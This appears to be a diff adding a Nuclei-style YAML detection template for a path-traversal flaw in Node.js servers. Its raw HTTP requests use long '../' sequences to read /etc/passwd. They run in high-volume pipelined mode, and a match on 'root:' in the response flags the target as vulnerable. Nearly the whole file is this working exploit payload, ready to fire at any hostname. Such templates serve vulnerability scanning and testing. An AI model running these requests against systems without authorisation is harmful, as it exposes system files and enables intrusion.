@@ -1,0 +1,47 @@
+id: Path_traversal_NodeJs
+
+info:
+  name: Path_traversal_NodeJs
+  author: 51pwn
+  severity: critical
+  reference:
+    - https://hackerone.com/reports/358112
+    - https://51pwn.com
+  tags: pathtraversal,nodejs,pts
+
+requests:
+  - raw:
+      - |+
+        GET /a.markdown/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      - |+
+        GET /../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      - |+
+        GET /test.php/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      # end payload
+    unsafe: true
+    pipeline: true
+    pipeline-concurrent-connections: 40
+    pipeline-requests-per-connection: 25000
+    cookie-reuse: true
+    req-condition: true
+    matchers-condition: and
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'not a directory'
+          - 'root:'
+        condition: or
